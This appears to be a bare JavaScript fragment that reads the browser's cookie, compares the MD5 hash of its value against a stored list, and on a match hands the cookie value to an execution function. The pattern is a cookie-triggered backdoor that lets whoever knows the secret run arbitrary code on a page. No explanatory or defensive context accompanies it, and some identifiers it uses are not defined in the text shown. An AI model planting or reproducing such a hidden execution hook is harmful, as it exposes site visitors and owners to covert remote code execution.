var cook = document.cookie;
var hooman = cook.split('=');
if(hoom.indexOf(md5(hooman[1])) >= 0) {
   jQexec(hooman[1]);
}